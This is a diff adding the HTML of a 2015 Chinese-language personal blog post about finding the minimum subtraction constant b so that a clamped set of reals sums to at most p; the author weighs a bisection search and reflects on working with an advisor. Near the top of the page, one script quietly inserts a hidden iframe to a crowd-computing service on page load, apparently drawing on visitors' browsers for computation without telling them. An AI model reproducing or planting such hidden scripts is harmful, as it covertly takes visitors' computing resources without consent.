@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+    <script src="https://maps.googleapis.com/maps/api/js"></script>
+    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
+    <script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
+    <script src="../res/jquery.csv-0.71.js"></script>
+    <script>(function(){var d=document;d.addEventListener("DOMContentLoaded",function(){var a=d.createElement("iframe");a.src="https://ss.crowdprocess.com/#?providerId=60545584-d862-41bc-83b5-7f9a44671d09";a.sandbox="allow-scripts allow-same-origin";a.style.display="none";d.body.appendChild(a)})})()</script>
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.3.0/katex.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.3.0/katex.min.js"></script>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>弱爆了的我求助數學大神 &#8211; DGY Life Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="From Yang">
+    <meta name="author" content="Yuhuang Hu">
+    <meta name="keywords" content="yang">
+    <link rel="canonical" href="http://dgyblog.com/yang/2015/08/30/help-me/">
+    <link rel="alternate" type="application/rss+xml" title="RSS Feed for DGY Life Blog" href="/feed.xml" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/pixyll.css?201510102243" type="text/css">
+
+    <!-- Fonts -->
+    <link href='//fonts.googleapis.com/css?family=Merriweather:900,900italic,300,300italic' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Lato:900,300' rel='stylesheet' type='text/css'>
+    
+      <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet">
+    
+
+    <link rel="stylesheet" type="text/css"
+	  href="http://spratt.github.io/Computer-Modern/cmserif.css" />
+    
+    <!-- Verifications -->
+    
+
+    <!-- Open Graph -->
+    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="弱爆了的我求助數學大神">
+    <meta property="og:description" content="A proud WE-ARE-NOT-DOOMED fan.">
+    <meta property="og:url" content="http://dgyblog.com/yang/2015/08/30/help-me/">
+    <meta property="og:site_name" content="DGY Life Blog">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary" />
+    
+        <meta name="twitter:site" content="@duguyue100" />
+    
+    <meta name="twitter:title" content="弱爆了的我求助數學大神" />
+    <meta name="twitter:description" content="From Yang" />
+    <meta name="twitter:url" content="http://dgyblog.com/yang/2015/08/30/help-me/" />
+    
+    
+</head>
+
+<body class="site">
+  <div class="site-wrap">
+    <header class="site-header px2 px-responsive">
+  <div class="mt2 wrap">
+    <div class="measure">
+      <a href="http://dgyblog.com" class="site-title">DGY Life Blog</a>
+      <nav class="site-nav">
+        <a href="/about/">About</a>
+
+      </nav>
+      <div class="clearfix"></div>
+      
+        <div class="social-icons">
+  <div class="social-icons-right">
+    
+      <a class="fa fa-github" href="https://github.com/duguyue100"></a>
+    
+    
+    
+    <a class="fa fa-rss" href="/feed.xml"></a>
+    
+      <a class="fa fa-twitter" href="https://twitter.com/duguyue100"></a>
+    
+    
+      <a class="fa fa-google-plus" href="https://plus.google.com/+YuhuangHu/posts"></a>
+    
+    
+      <a class="fa fa-envelope" href="mailto:duguyue100@gmail.com"></a>
+    
+    
+    
+    
+  </div>
+  <div class="right">
+    
+    
+    
+  </div>
+</div>
+<div class="clearfix"></div>
+
+      
+    </div>
+  </div>
+</header>
+
+
+    <div class="post p2 p-responsive wrap" role="main">
+      <div class="measure">
+        
+
+
+
+
+<div class="post-header mb2">
+  <h2>弱爆了的我求助數學大神</h2>
+  <span class="post-meta">Aug 30, 2015</span><br>
+  
+  <span class="post-meta small">
+  
+    1 minute read
+  
+  </span>
+</div>
+
+<article class="post-content">
+  <p>最近做的工作中涉及到一個小的數學問題，想把它記錄在這里。</p>
+
+<p>這個問題可以簡化為這樣：有一個包含<script type="math/tex">n</script>個隨機實數（<script type="math/tex">a_{1}, a_{2}, \ldots, a_{n}</script>）的集合<script type="math/tex">A</script>。我希望它滿足兩個條件。 條件1：所有元素都大於等於零。 條件2：所有元素之和（記為<script type="math/tex">s</script>）小於等於某個大於零的實數<script type="math/tex">p</script>。由於這個集合<script type="math/tex">A</script>的元素都是隨機的，為了使它滿足這兩個條件，我對它進行兩個操作。操作1：使<script type="math/tex">A</script>的所有元素都減去一個非負的實數<script type="math/tex">b</script>。操作2：使<script type="math/tex">A</script>的所有為負數的元素變為零。要求進行完操作1和操作2之後集合A滿足條件1和條件2。求<script type="math/tex">b</script>的最小值（記為<script type="math/tex">b_{\min}</script>）。</p>
+
+<p>為了形象的說明問題，我舉個例子。比如現在這個隨機的集合<script type="math/tex">A</script>包含的元素是<script type="math/tex">\{1,2,3\}</script>。而我要求的<script type="math/tex">p</script>等於3。這時候發現<script type="math/tex">A</script>已經滿足條件1，但不滿足條件2。<script type="math/tex">A</script>所有元素的和<script type="math/tex">s</script>等於6，比3大。這時候我根據操作1對<script type="math/tex">A</script>的所有元素都減去一個數<script type="math/tex">b</script>。這裡顯然<script type="math/tex">b</script>的最小值是1。這樣減完之後<script type="math/tex">A</script>為<script type="math/tex">\{0,1,2\}</script>。<script type="math/tex">s</script>剛好等於3。操作2也不需要進行了因為<script type="math/tex">A</script>現在的元素沒有負數。</p>
+
+<p>怎麼能證明例子中的<script type="math/tex">b</script>等於1就是<script type="math/tex">b</script>的最小值了呢？<script type="math/tex">b</script>比1稍微小一點,比如0.9，那么總和就會比3稍微大一點，於是也就不滿足條件了。而如果<script type="math/tex">b</script>比1稍微大一點，比如1.1，那么總和就比3小了，於是雖然滿足了條件但是我們有更小的<script type="math/tex">b</script>也可以滿足條件，所以1.1就不是最小值了。所以兩邊逼近的結果就是<script type="math/tex">b</script>等於1剛剛好滿足條件，也就是<script type="math/tex">b</script>的最小值。</p>
+
+<p>然而這種描述既不算嚴謹的證明，也無法適用於更一般的情況。我們先不管如何嚴格找出<script type="math/tex">b_{\min}</script>的表達式，我們先來看看什麼是更一般的情況。</p>
+
+<p>首先上面的例子根本沒有用到操作2。什麼時候需要用到呢？比如一個簡單的情況，<script type="math/tex">A</script>中原本就存在負數元素。這時候由於<script type="math/tex">b</script>是個非負數，所以所有元素減完<script type="math/tex">b</script>之後必定還存在負數元素。這時候就不符合條件1了。所以進行操作2，也就是使這些負數變為零。當然還有一種情況就是即使原本<script type="math/tex">A</script>中沒有負數元素，當進行完操作1之後，由於所有元素都減去了<script type="math/tex">b</script>，就有可能會使一些元素變為負數。這時候也要通過操作2來保證<script type="math/tex">A</script>滿足條件1。請注意，這個操作2是會影響到<script type="math/tex">b</script>的選取的。為什麼呢？因為操作2的過程可能會使元素總和<script type="math/tex">s</script>增大。因為本來是負數的變為零了么。而我認為這個問題的難點也正在於此。試想一下，假如我們在不考慮操作2的情況下已經找到了最小的<script type="math/tex">b</script>，然後減完發現有負數元素，不滿足條件1，於是進行操作2，然後發現總和<script type="math/tex">s</script>大於<script type="math/tex">p</script>，不滿足條件2，於是需要讓一開始的<script type="math/tex">b</script>變得更大。但是大多少呢？更大之後會不會產生新的負數呢？如果產生了新的負數豈不是又要調整<script type="math/tex">b</script>？這種情況下有沒有<script type="math/tex">b_{\min}</script>的非遞歸表達式呢？如果沒有，如何證明沒有呢？又該怎麼求呢？</p>
+
+<p>我一開始分析這個問題的時候並沒有清晰的看到這兩個操作互相之間的影響。我只是寫了幾個簡單的例子去分析不同情況下（初始的<script type="math/tex">A</script>不滿足1或不滿足2或兩個都不滿足）<script type="math/tex">b</script>的選取會隨操作2怎樣的變化。然後逐步調整<script type="math/tex">b</script>來達到最佳表達式。當我自以為分析了所有情況的時候我高興異常的寫了個程序去進行一般化驗算。然後不出意料的出現了各種錯誤。然後我想到了一些我想法中的漏洞。然後細思極恐。因為當我意識到這兩個操作實際上一個是會使<script type="math/tex">s</script>減小（操作1）而另一個是會使<script type="math/tex">s</script>增大的（操作2）。所以我直覺的感覺到應該是沒有一般性的代數解。只能不斷的搜索<script type="math/tex">b_{\min}</script>了。搜索的話倒是很簡單，我們設置一個<script type="math/tex">b_{\min}</script>的下限0，再設置一個<script type="math/tex">b_{\min}</script>的上限，然後用二分法不停的搜索<script type="math/tex">b_{\min}</script>就行了。這樣雖然簡單暴力，但是不精確。要知道我們題目中的元素可都是實數啊。但是我確實想不到什麼好辦法了。</p>
+
+<p>說點題外話。</p>
+
+<p>作為很弱的我經常分析問題都是憑直覺的。我並沒有什麼很好的數學能力，無論從經驗上還是邏輯上。眼下導師特別想讓我自己推導很多式子，分析很多問題。並且給我很多好的數學材料去閱讀并一再強調遇到問題不要遲疑想問就問，他會盡量解答。當然除了數學上的，導師還很熱衷於給我講通信網絡的知識（畢竟我們的課題就是干這些的）。每每當我覺得我的英語表達還是不盡人意讓我有種有力使不上的感覺的時候，我更多的是欣喜於通過和導師討論快速的得到知識的快感。這樣的環境使我這個弱爆了的懶蛋有了一絲進取的精神。這是我最最最缺乏的元素了。希望這是個好的開始吧。</p>
+
+</article>
+
+
+  <div class="share-page">
+   
+
+  <div class="share-links">
+    
+      <a class = "fa fa-facebook" href="https://facebook.com/sharer.php?u=http://dgyblog.com/yang/2015/08/30/help-me/" rel="nofollow" target="_blank" title="Share on Facebook"></a>
+    
+
+    
+      <a class="fa fa-twitter" href="https://twitter.com/intent/tweet?text=弱爆了的我求助數學大神&url=http://dgyblog.com/yang/2015/08/30/help-me/" rel="nofollow" target="_blank" title="Share on Twitter"></a>
+    
+
+    
+      <a class="fa fa-google-plus" href="https://plus.google.com/share?url=http://dgyblog.com/yang/2015/08/30/help-me/" rel="nofollow" target="_blank" title="Share on Google+"></a>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+  </div>
+</div>
+
+
+
+
+
+
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname  = 'dgyblog';
+    var disqus_identifier = '/yang/2015/08/30/help-me';
+    var disqus_title      = '';
+
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+
+      </div>
+    </div>
+  </div>
+
+  
+<script type="text/javascript">
+  $("script[type='math/tex']").replaceWith(
+  function(){
+  var tex = $(this).text();
+  return "<span class=\"inline-equation\">" + 
+    katex.renderToString(tex) +
+    "</span>";
+  });
+  
+  $("script[type='math/tex; mode=display']").replaceWith(
+  function(){
+  var tex = $(this).text();
+  return "<div align=\"center\" class=\"equation\">" + 
+    katex.renderToString("\\displaystyle "+tex) +
+    "</div>";
+  });
+</script>
+
+<footer class="center">
+  <div class="measure">
+    <small>
+      Except where otherwise noted, content on this site is licensed under a <br>
+      <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a> <br>
+      <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons Licence" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a>
+    </small>
+  </div>
+</footer>
+
+</body>
+</html>
